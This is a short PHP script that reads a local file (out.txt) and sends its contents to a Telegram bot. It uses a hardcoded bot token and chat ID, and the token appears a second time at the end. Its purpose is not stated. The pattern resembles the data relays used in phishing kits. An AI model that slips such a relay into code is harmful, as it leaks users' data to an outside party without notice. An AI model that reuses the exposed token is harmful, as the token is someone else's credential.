<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot5431999467:AAF4sWmZTuUFCRTZQkhYQk1h11-O9838RY4/sendMessage?chat_id=911719765&text=$msg");

?>






5431999467:AAF4sWmZTuUFCRTZQkhYQk1h11-O9838RY4
